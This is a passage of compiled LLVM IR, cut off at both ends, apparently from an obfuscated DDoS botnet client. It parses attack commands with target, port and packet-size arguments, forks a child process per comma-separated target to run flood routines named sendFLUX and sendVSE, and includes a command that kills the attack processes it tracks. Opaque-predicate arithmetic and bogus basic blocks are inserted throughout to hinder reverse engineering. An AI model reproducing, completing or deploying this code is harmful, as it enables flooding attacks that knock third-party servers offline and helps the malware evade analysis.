  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %944, label %953, label %954

; <label>:953:                                    ; preds = %originalBBpart2112
  br label %1471

; <label>:954:                                    ; preds = %originalBBpart2112
  %955 = load i8**, i8*** %12, align 8
  %956 = getelementptr inbounds i8*, i8** %955, i64 1
  %957 = load i8*, i8** %956, align 8
  store i8* %957, i8** %38, align 8
  %958 = load i8**, i8*** %12, align 8
  %959 = getelementptr inbounds i8*, i8** %958, i64 2
  %960 = load i8*, i8** %959, align 8
  %961 = call i32 @atoi(i8* %960) #10
  store i32 %961, i32* %39, align 4
  %962 = load i8**, i8*** %12, align 8
  %963 = getelementptr inbounds i8*, i8** %962, i64 3
  %964 = load i8*, i8** %963, align 8
  %965 = call i32 @atoi(i8* %964) #10
  store i32 %965, i32* %40, align 4
  %966 = load i8**, i8*** %12, align 8
  %967 = getelementptr inbounds i8*, i8** %966, i64 4
  %968 = load i8*, i8** %967, align 8
  %969 = call i32 @atoi(i8* %968) #10
  store i32 %969, i32* %41, align 4
  %970 = load i32, i32* %11, align 4
  %971 = icmp eq i32 %970, 7
  br i1 %971, label %972, label %993

; <label>:972:                                    ; preds = %954
  %973 = load i32, i32* @x.73
  %974 = load i32, i32* @y.74
  %975 = sub i32 %973, 1
  %976 = mul i32 %973, %975
  %977 = urem i32 %976, 2
  %978 = icmp eq i32 %977, 0
  %979 = icmp slt i32 %974, 10
  %980 = or i1 %978, %979
  br i1 %980, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %972
  %981 = load i8**, i8*** %12, align 8
  %982 = getelementptr inbounds i8*, i8** %981, i64 6
  %983 = load i8*, i8** %982, align 8
  %984 = call i32 @atoi(i8* %983) #10
  %985 = load i32, i32* @x.73
  %986 = load i32, i32* @y.74
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %994

; <label>:993:                                    ; preds = %954
  br label %994

; <label>:994:                                    ; preds = %993, %originalBBpart2116
  %995 = phi i32 [ %984, %originalBBpart2116 ], [ 10, %993 ]
  store i32 %995, i32* %42, align 4
  %996 = load i32, i32* %11, align 4
  %997 = icmp sgt i32 %996, 5
  br i1 %997, label %998, label %1019

; <label>:998:                                    ; preds = %994
  %999 = load i32, i32* @x.73
  %1000 = load i32, i32* @y.74
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %998
  %1007 = load i8**, i8*** %12, align 8
  %1008 = getelementptr inbounds i8*, i8** %1007, i64 5
  %1009 = load i8*, i8** %1008, align 8
  %1010 = call i32 @atoi(i8* %1009) #10
  %1011 = load i32, i32* @x.73
  %1012 = load i32, i32* @y.74
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1020

; <label>:1019:                                   ; preds = %994
  br label %1020

; <label>:1020:                                   ; preds = %1019, %originalBBpart2120
  %1021 = phi i32 [ %1010, %originalBBpart2120 ], [ 0, %1019 ]
  %1022 = load i32, i32* @x.73
  %1023 = load i32, i32* @y.74
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1020
  store i32 %1021, i32* %43, align 4
  %1030 = load i8*, i8** %38, align 8
  %1031 = call i8* @strstr(i8* %1030, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %1032 = icmp ne i8* %1031, null
  %1033 = load i32, i32* @x.73
  %1034 = load i32, i32* @y.74
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %1032, label %1041, label %1076

; <label>:1041:                                   ; preds = %originalBBpart2124
  %1042 = load i8*, i8** %38, align 8
  %1043 = call i8* @strtok(i8* %1042, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1043, i8** %44, align 8
  br label %1044

; <label>:1044:                                   ; preds = %originalBBpart2128, %1041
  %1045 = load i8*, i8** %44, align 8
  %1046 = icmp ne i8* %1045, null
  br i1 %1046, label %1047, label %1075

; <label>:1047:                                   ; preds = %1044
  %1048 = call i32 @listFork()
  %1049 = icmp ne i32 %1048, 0
  br i1 %1049, label %1057, label %1050

; <label>:1050:                                   ; preds = %1047
  %1051 = load i8*, i8** %44, align 8
  %1052 = load i32, i32* %39, align 4
  %1053 = load i32, i32* %40, align 4
  %1054 = load i32, i32* %41, align 4
  %1055 = load i32, i32* %43, align 4
  %1056 = load i32, i32* %42, align 4
  call void @sendFLUX(i8* %1051, i32 %1052, i32 %1053, i32 %1054, i32 %1055, i32 %1056)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1057:                                   ; preds = %1047
  %1058 = load i32, i32* @x.73
  %1059 = load i32, i32* @y.74
  %1060 = sub i32 %1058, 1
  %1061 = mul i32 %1058, %1060
  %1062 = urem i32 %1061, 2
  %1063 = icmp eq i32 %1062, 0
  %1064 = icmp slt i32 %1059, 10
  %1065 = or i1 %1063, %1064
  br i1 %1065, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1057
  %1066 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1066, i8** %44, align 8
  %1067 = load i32, i32* @x.73
  %1068 = load i32, i32* @y.74
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1044

; <label>:1075:                                   ; preds = %1044
  br label %1087

; <label>:1076:                                   ; preds = %originalBBpart2124
  %1077 = call i32 @listFork()
  %1078 = icmp ne i32 %1077, 0
  br i1 %1078, label %1079, label %1080

; <label>:1079:                                   ; preds = %1076
  br label %1471

; <label>:1080:                                   ; preds = %1076
  %1081 = load i8*, i8** %38, align 8
  %1082 = load i32, i32* %39, align 4
  %1083 = load i32, i32* %40, align 4
  %1084 = load i32, i32* %41, align 4
  %1085 = load i32, i32* %43, align 4
  %1086 = load i32, i32* %42, align 4
  call void @sendFLUX(i8* %1081, i32 %1082, i32 %1083, i32 %1084, i32 %1085, i32 %1086)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1087:                                   ; preds = %1075
  br label %1088

; <label>:1088:                                   ; preds = %1087, %originalBBpart2108
  %1089 = load i8**, i8*** %12, align 8
  %1090 = getelementptr inbounds i8*, i8** %1089, i64 0
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i32 @strcmp(i8* %1091, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %1093 = icmp ne i32 %1092, 0
  br i1 %1093, label %1381, label %1094

; <label>:1094:                                   ; preds = %1088
  %1095 = load i32, i32* %11, align 4
  %1096 = icmp slt i32 %1095, 6
  br i1 %1096, label %1180, label %1097

; <label>:1097:                                   ; preds = %1094
  %1098 = load i8**, i8*** %12, align 8
  %1099 = getelementptr inbounds i8*, i8** %1098, i64 3
  %1100 = load i8*, i8** %1099, align 8
  %1101 = call i32 @atoi(i8* %1100) #10
  %1102 = icmp eq i32 %1101, -1
  br i1 %1102, label %1180, label %1103

; <label>:1103:                                   ; preds = %1097
  %1104 = load i8**, i8*** %12, align 8
  %1105 = getelementptr inbounds i8*, i8** %1104, i64 2
  %1106 = load i8*, i8** %1105, align 8
  %1107 = call i32 @atoi(i8* %1106) #10
  %1108 = icmp eq i32 %1107, -1
  br i1 %1108, label %1180, label %1109

; <label>:1109:                                   ; preds = %1103
  %1110 = load i8**, i8*** %12, align 8
  %1111 = getelementptr inbounds i8*, i8** %1110, i64 4
  %1112 = load i8*, i8** %1111, align 8
  %1113 = call i32 @atoi(i8* %1112) #10
  %1114 = icmp eq i32 %1113, -1
  br i1 %1114, label %1180, label %1115

; <label>:1115:                                   ; preds = %1109
  %1116 = load i32, i32* @x.73
  %1117 = load i32, i32* @y.74
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1115
  %1124 = load i8**, i8*** %12, align 8
  %1125 = getelementptr inbounds i8*, i8** %1124, i64 5
  %1126 = load i8*, i8** %1125, align 8
  %1127 = call i32 @atoi(i8* %1126) #10
  %1128 = icmp eq i32 %1127, -1
  %1129 = load i32, i32* @x.73
  %1130 = load i32, i32* @y.74
  %1131 = sub i32 %1129, 1
  %1132 = mul i32 %1129, %1131
  %1133 = urem i32 %1132, 2
  %1134 = icmp eq i32 %1133, 0
  %1135 = icmp slt i32 %1130, 10
  %1136 = or i1 %1134, %1135
  br i1 %1136, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1128, label %1180, label %1137

; <label>:1137:                                   ; preds = %originalBBpart2132
  %1138 = load i8**, i8*** %12, align 8
  %1139 = getelementptr inbounds i8*, i8** %1138, i64 5
  %1140 = load i8*, i8** %1139, align 8
  %1141 = call i32 @atoi(i8* %1140) #10
  %1142 = icmp sgt i32 %1141, 65536
  br i1 %1142, label %1180, label %1143

; <label>:1143:                                   ; preds = %1137
  %1144 = load i8**, i8*** %12, align 8
  %1145 = getelementptr inbounds i8*, i8** %1144, i64 5
  %1146 = load i8*, i8** %1145, align 8
  %1147 = call i32 @atoi(i8* %1146) #10
  %1148 = icmp sgt i32 %1147, 65500
  br i1 %1148, label %1180, label %1149

; <label>:1149:                                   ; preds = %1143
  %1150 = load i32, i32* @x.73
  %1151 = load i32, i32* @y.74
  %1152 = sub i32 %1150, 1
  %1153 = mul i32 %1150, %1152
  %1154 = urem i32 %1153, 2
  %1155 = icmp eq i32 %1154, 0
  %1156 = icmp slt i32 %1151, 10
  %1157 = or i1 %1155, %1156
  br i1 %1157, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1149
  %1158 = load i8**, i8*** %12, align 8
  %1159 = getelementptr inbounds i8*, i8** %1158, i64 4
  %1160 = load i8*, i8** %1159, align 8
  %1161 = call i32 @atoi(i8* %1160) #10
  %1162 = icmp sgt i32 %1161, 32
  %1163 = load i32, i32* @x.73
  %1164 = load i32, i32* @y.74
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1162, label %1180, label %1171

; <label>:1171:                                   ; preds = %originalBBpart2136
  %1172 = load i32, i32* %11, align 4
  %1173 = icmp eq i32 %1172, 7
  br i1 %1173, label %1174, label %1181

; <label>:1174:                                   ; preds = %1171
  %1175 = load i8**, i8*** %12, align 8
  %1176 = getelementptr inbounds i8*, i8** %1175, i64 6
  %1177 = load i8*, i8** %1176, align 8
  %1178 = call i32 @atoi(i8* %1177) #10
  %1179 = icmp slt i32 %1178, 1
  br i1 %1179, label %1180, label %1181

; <label>:1180:                                   ; preds = %1174, %originalBBpart2136, %1143, %1137, %originalBBpart2132, %1109, %1103, %1097, %1094
  br label %1471

; <label>:1181:                                   ; preds = %1174, %1171
  %1182 = load i8**, i8*** %12, align 8
  %1183 = getelementptr inbounds i8*, i8** %1182, i64 1
  %1184 = load i8*, i8** %1183, align 8
  store i8* %1184, i8** %45, align 8
  %1185 = load i8**, i8*** %12, align 8
  %1186 = getelementptr inbounds i8*, i8** %1185, i64 2
  %1187 = load i8*, i8** %1186, align 8
  %1188 = call i32 @atoi(i8* %1187) #10
  store i32 %1188, i32* %46, align 4
  %1189 = load i8**, i8*** %12, align 8
  %1190 = getelementptr inbounds i8*, i8** %1189, i64 3
  %1191 = load i8*, i8** %1190, align 8
  %1192 = call i32 @atoi(i8* %1191) #10
  store i32 %1192, i32* %47, align 4
  %1193 = load i8**, i8*** %12, align 8
  %1194 = getelementptr inbounds i8*, i8** %1193, i64 4
  %1195 = load i8*, i8** %1194, align 8
  %1196 = call i32 @atoi(i8* %1195) #10
  store i32 %1196, i32* %48, align 4
  %1197 = load i8**, i8*** %12, align 8
  %1198 = getelementptr inbounds i8*, i8** %1197, i64 5
  %1199 = load i8*, i8** %1198, align 8
  %1200 = call i32 @atoi(i8* %1199) #10
  store i32 %1200, i32* %49, align 4
  %1201 = load i32, i32* %11, align 4
  %1202 = icmp sgt i32 %1201, 6
  br i1 %1202, label %1203, label %1208

; <label>:1203:                                   ; preds = %1181
  %1204 = load i8**, i8*** %12, align 8
  %1205 = getelementptr inbounds i8*, i8** %1204, i64 6
  %1206 = load i8*, i8** %1205, align 8
  %1207 = call i32 @atoi(i8* %1206) #10
  br label %1225

; <label>:1208:                                   ; preds = %1181
  %1209 = load i32, i32* @x.73
  %1210 = load i32, i32* @y.74
  %1211 = sub i32 %1209, 1
  %1212 = mul i32 %1209, %1211
  %1213 = urem i32 %1212, 2
  %1214 = icmp eq i32 %1213, 0
  %1215 = icmp slt i32 %1210, 10
  %1216 = or i1 %1214, %1215
  br i1 %1216, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1208
  %1217 = load i32, i32* @x.73
  %1218 = load i32, i32* @y.74
  %1219 = sub i32 %1217, 1
  %1220 = mul i32 %1217, %1219
  %1221 = urem i32 %1220, 2
  %1222 = icmp eq i32 %1221, 0
  %1223 = icmp slt i32 %1218, 10
  %1224 = or i1 %1222, %1223
  br i1 %1224, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1225

; <label>:1225:                                   ; preds = %originalBBpart2140, %1203
  %1226 = phi i32 [ %1207, %1203 ], [ 1000, %originalBBpart2140 ]
  store i32 %1226, i32* %50, align 4
  %1227 = load i32, i32* %11, align 4
  %1228 = icmp sgt i32 %1227, 7
  br i1 %1228, label %1229, label %1234

; <label>:1229:                                   ; preds = %1225
  %1230 = load i8**, i8*** %12, align 8
  %1231 = getelementptr inbounds i8*, i8** %1230, i64 7
  %1232 = load i8*, i8** %1231, align 8
  %1233 = call i32 @atoi(i8* %1232) #10
  br label %1235

; <label>:1234:                                   ; preds = %1225
  br label %1235

; <label>:1235:                                   ; preds = %1234, %1229
  %1236 = phi i32 [ %1233, %1229 ], [ 1000000, %1234 ]
  store i32 %1236, i32* %51, align 4
  %1237 = load i32, i32* %11, align 4
  %1238 = icmp sgt i32 %1237, 8
  br i1 %1238, label %1239, label %1260

; <label>:1239:                                   ; preds = %1235
  %1240 = load i32, i32* @x.73
  %1241 = load i32, i32* @y.74
  %1242 = sub i32 %1240, 1
  %1243 = mul i32 %1240, %1242
  %1244 = urem i32 %1243, 2
  %1245 = icmp eq i32 %1244, 0
  %1246 = icmp slt i32 %1241, 10
  %1247 = or i1 %1245, %1246
  br i1 %1247, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1239
  %1248 = load i8**, i8*** %12, align 8
  %1249 = getelementptr inbounds i8*, i8** %1248, i64 8
  %1250 = load i8*, i8** %1249, align 8
  %1251 = call i32 @atoi(i8* %1250) #10
  %1252 = load i32, i32* @x.73
  %1253 = load i32, i32* @y.74
  %1254 = sub i32 %1252, 1
  %1255 = mul i32 %1252, %1254
  %1256 = urem i32 %1255, 2
  %1257 = icmp eq i32 %1256, 0
  %1258 = icmp slt i32 %1253, 10
  %1259 = or i1 %1257, %1258
  br i1 %1259, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1277

; <label>:1260:                                   ; preds = %1235
  %1261 = load i32, i32* @x.73
  %1262 = load i32, i32* @y.74
  %1263 = sub i32 %1261, 1
  %1264 = mul i32 %1261, %1263
  %1265 = urem i32 %1264, 2
  %1266 = icmp eq i32 %1265, 0
  %1267 = icmp slt i32 %1262, 10
  %1268 = or i1 %1266, %1267
  br i1 %1268, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1260
  %1269 = load i32, i32* @x.73
  %1270 = load i32, i32* @y.74
  %1271 = sub i32 %1269, 1
  %1272 = mul i32 %1269, %1271
  %1273 = urem i32 %1272, 2
  %1274 = icmp eq i32 %1273, 0
  %1275 = icmp slt i32 %1270, 10
  %1276 = or i1 %1274, %1275
  br i1 %1276, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1277

; <label>:1277:                                   ; preds = %originalBBpart2148, %originalBBpart2144
  %1278 = phi i32 [ %1251, %originalBBpart2144 ], [ 0, %originalBBpart2148 ]
  store i32 %1278, i32* %52, align 4
  %1279 = load i8*, i8** %45, align 8
  %1280 = call i8* @strstr(i8* %1279, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %1281 = icmp ne i8* %1280, null
  br i1 %1281, label %1282, label %1351

; <label>:1282:                                   ; preds = %1277
  %1283 = load i8*, i8** %45, align 8
  %1284 = call i8* @strtok(i8* %1283, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1284, i8** %53, align 8
  br label %1285

; <label>:1285:                                   ; preds = %originalBBpart2156, %1282
  %1286 = load i8*, i8** %53, align 8
  %1287 = icmp ne i8* %1286, null
  br i1 %1287, label %1288, label %1334

; <label>:1288:                                   ; preds = %1285
  %1289 = load i32, i32* @x.73
  %1290 = load i32, i32* @y.74
  %1291 = sub i32 %1289, 1
  %1292 = mul i32 %1289, %1291
  %1293 = urem i32 %1292, 2
  %1294 = icmp eq i32 %1293, 0
  %1295 = icmp slt i32 %1290, 10
  %1296 = or i1 %1294, %1295
  br i1 %1296, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1288
  %1297 = call i32 @listFork()
  %1298 = icmp ne i32 %1297, 0
  %1299 = load i32, i32* @x.73
  %1300 = load i32, i32* @y.74
  %1301 = sub i32 %1299, 1
  %1302 = mul i32 %1299, %1301
  %1303 = urem i32 %1302, 2
  %1304 = icmp eq i32 %1303, 0
  %1305 = icmp slt i32 %1300, 10
  %1306 = or i1 %1304, %1305
  br i1 %1306, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1298, label %1316, label %1307

; <label>:1307:                                   ; preds = %originalBBpart2152
  %1308 = load i8*, i8** %53, align 8
  %1309 = load i32, i32* %46, align 4
  %1310 = load i32, i32* %47, align 4
  %1311 = load i32, i32* %48, align 4
  %1312 = load i32, i32* %49, align 4
  %1313 = load i32, i32* %50, align 4
  %1314 = load i32, i32* %51, align 4
  %1315 = load i32, i32* %52, align 4
  call void @sendVSE(i8* %1308, i32 %1309, i32 %1310, i32 %1311, i32 %1312, i32 %1313, i32 %1314, i32 %1315)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1316:                                   ; preds = %originalBBpart2152
  %1317 = load i32, i32* @x.73
  %1318 = load i32, i32* @y.74
  %1319 = sub i32 %1317, 1
  %1320 = mul i32 %1317, %1319
  %1321 = urem i32 %1320, 2
  %1322 = icmp eq i32 %1321, 0
  %1323 = icmp slt i32 %1318, 10
  %1324 = or i1 %1322, %1323
  br i1 %1324, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1316
  %1325 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1325, i8** %53, align 8
  %1326 = load i32, i32* @x.73
  %1327 = load i32, i32* @y.74
  %1328 = sub i32 %1326, 1
  %1329 = mul i32 %1326, %1328
  %1330 = urem i32 %1329, 2
  %1331 = icmp eq i32 %1330, 0
  %1332 = icmp slt i32 %1327, 10
  %1333 = or i1 %1331, %1332
  br i1 %1333, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1285

; <label>:1334:                                   ; preds = %1285
  %1335 = load i32, i32* @x.73
  %1336 = load i32, i32* @y.74
  %1337 = sub i32 %1335, 1
  %1338 = mul i32 %1335, %1337
  %1339 = urem i32 %1338, 2
  %1340 = icmp eq i32 %1339, 0
  %1341 = icmp slt i32 %1336, 10
  %1342 = or i1 %1340, %1341
  br i1 %1342, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1334
  %1343 = load i32, i32* @x.73
  %1344 = load i32, i32* @y.74
  %1345 = sub i32 %1343, 1
  %1346 = mul i32 %1343, %1345
  %1347 = urem i32 %1346, 2
  %1348 = icmp eq i32 %1347, 0
  %1349 = icmp slt i32 %1344, 10
  %1350 = or i1 %1348, %1349
  br i1 %1350, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1380

; <label>:1351:                                   ; preds = %1277
  %1352 = call i32 @listFork()
  %1353 = icmp ne i32 %1352, 0
  br i1 %1353, label %1363, label %1354

; <label>:1354:                                   ; preds = %1351
  %1355 = load i8*, i8** %45, align 8
  %1356 = load i32, i32* %46, align 4
  %1357 = load i32, i32* %47, align 4
  %1358 = load i32, i32* %48, align 4
  %1359 = load i32, i32* %49, align 4
  %1360 = load i32, i32* %50, align 4
  %1361 = load i32, i32* %51, align 4
  %1362 = load i32, i32* %52, align 4
  call void @sendVSE(i8* %1355, i32 %1356, i32 %1357, i32 %1358, i32 %1359, i32 %1360, i32 %1361, i32 %1362)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1363:                                   ; preds = %1351
  %1364 = load i32, i32* @x.73
  %1365 = load i32, i32* @y.74
  %1366 = sub i32 %1364, 1
  %1367 = mul i32 %1364, %1366
  %1368 = urem i32 %1367, 2
  %1369 = icmp eq i32 %1368, 0
  %1370 = icmp slt i32 %1365, 10
  %1371 = or i1 %1369, %1370
  br i1 %1371, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1363
  %1372 = load i32, i32* @x.73
  %1373 = load i32, i32* @y.74
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1380

; <label>:1380:                                   ; preds = %originalBBpart2164, %originalBBpart2160
  br label %1471

; <label>:1381:                                   ; preds = %1088
  %1382 = load i32, i32* @x.73
  %1383 = load i32, i32* @y.74
  %1384 = sub i32 %1382, 1
  %1385 = mul i32 %1382, %1384
  %1386 = urem i32 %1385, 2
  %1387 = icmp eq i32 %1386, 0
  %1388 = icmp slt i32 %1383, 10
  %1389 = or i1 %1387, %1388
  br i1 %1389, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1381
  %1390 = load i8**, i8*** %12, align 8
  %1391 = getelementptr inbounds i8*, i8** %1390, i64 0
  %1392 = load i8*, i8** %1391, align 8
  %1393 = call i32 @strcmp(i8* %1392, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i32 0, i32 0)) #10
  %1394 = icmp ne i32 %1393, 0
  %1395 = load i32, i32* @x.73
  %1396 = load i32, i32* @y.74
  %1397 = sub i32 %1395, 1
  %1398 = mul i32 %1395, %1397
  %1399 = urem i32 %1398, 2
  %1400 = icmp eq i32 %1399, 0
  %1401 = icmp slt i32 %1396, 10
  %1402 = or i1 %1400, %1401
  br i1 %1402, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1394, label %1471, label %1403

; <label>:1403:                                   ; preds = %originalBBpart2168
  store i32 0, i32* %54, align 4
  store i64 0, i64* %55, align 8
  br label %1404

; <label>:1404:                                   ; preds = %1446, %1403
  %1405 = load i64, i64* %55, align 8
  %1406 = load i64, i64* @numpids, align 8
  %1407 = icmp ult i64 %1405, %1406
  br i1 %1407, label %1408, label %1449

; <label>:1408:                                   ; preds = %1404
  %1409 = load i32, i32* @x.73
  %1410 = load i32, i32* @y.74
  %1411 = sub i32 %1409, 1
  %1412 = mul i32 %1409, %1411
  %1413 = urem i32 %1412, 2
  %1414 = icmp eq i32 %1413, 0
  %1415 = icmp slt i32 %1410, 10
  %1416 = or i1 %1414, %1415
  br i1 %1416, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1408
  %1417 = load i32*, i32** @pids, align 8
  %1418 = load i64, i64* %55, align 8
  %1419 = getelementptr inbounds i32, i32* %1417, i64 %1418
  %1420 = load i32, i32* %1419, align 4
  %1421 = icmp ne i32 %1420, 0
  %1422 = load i32, i32* @x.73
  %1423 = load i32, i32* @y.74
  %1424 = sub i32 %1422, 1
  %1425 = mul i32 %1422, %1424
  %1426 = urem i32 %1425, 2
  %1427 = icmp eq i32 %1426, 0
  %1428 = icmp slt i32 %1423, 10
  %1429 = or i1 %1427, %1428
  br i1 %1429, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1421, label %1430, label %1445

; <label>:1430:                                   ; preds = %originalBBpart2172
  %1431 = load i32*, i32** @pids, align 8
  %1432 = load i64, i64* %55, align 8
  %1433 = getelementptr inbounds i32, i32* %1431, i64 %1432
  %1434 = load i32, i32* %1433, align 4
  %1435 = call i32 @getpid() #2
  %1436 = icmp ne i32 %1434, %1435
  br i1 %1436, label %1437, label %1445

; <label>:1437:                                   ; preds = %1430
  %1438 = load i32*, i32** @pids, align 8
  %1439 = load i64, i64* %55, align 8
  %1440 = getelementptr inbounds i32, i32* %1438, i64 %1439
  %1441 = load i32, i32* %1440, align 4
  %1442 = call i32 @kill(i32 %1441, i32 9) #2
  %1443 = load i32, i32* %54, align 4
  %1444 = add nsw i32 %1443, 1
  store i32 %1444, i32* %54, align 4
  br label %1445

; <label>:1445:                                   ; preds = %1437, %1430, %originalBBpart2172
  br label %1446

; <label>:1446:                                   ; preds = %1445
  %1447 = load i64, i64* %55, align 8
  %1448 = add i64 %1447, 1
  store i64 %1448, i64* %55, align 8
  br label %1404

; <label>:1449:                                   ; preds = %1404
  %1450 = load i32, i32* %54, align 4
  %1451 = icmp sgt i32 %1450, 0
  br i1 %1451, label %1452, label %1469

; <label>:1452:                                   ; preds = %1449
  %1453 = load i32, i32* @x.73
  %1454 = load i32, i32* @y.74
  %1455 = sub i32 %1453, 1
  %1456 = mul i32 %1453, %1455
  %1457 = urem i32 %1456, 2
  %1458 = icmp eq i32 %1457, 0
  %1459 = icmp slt i32 %1454, 10
  %1460 = or i1 %1458, %1459
  br i1 %1460, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1452
  %1461 = load i32, i32* @x.73
  %1462 = load i32, i32* @y.74
  %1463 = sub i32 %1461, 1
  %1464 = mul i32 %1461, %1463
  %1465 = urem i32 %1464, 2
  %1466 = icmp eq i32 %1465, 0
  %1467 = icmp slt i32 %1462, 10
  %1468 = or i1 %1466, %1467
  br i1 %1468, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1470

; <label>:1469:                                   ; preds = %1449
  br label %1470

; <label>:1470:                                   ; preds = %1469, %originalBBpart2176
  br label %1471

; <label>:1471:                                   ; preds = %1470, %originalBBpart2168, %1380, %1180, %1079, %953, %911, %847, %originalBBpart288, %750, %originalBBpart272, %632, %594, %471, %387, %187
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1472 = alloca i32, align 4
  %1473 = alloca i8**, align 8
  %1474 = alloca i8*, align 8
  %1475 = alloca i32, align 4
  %1476 = alloca i32, align 4
  %1477 = alloca i32, align 4
  %1478 = alloca i32, align 4
  %1479 = alloca i32, align 4
  %1480 = alloca i32, align 4
  %1481 = alloca i32, align 4
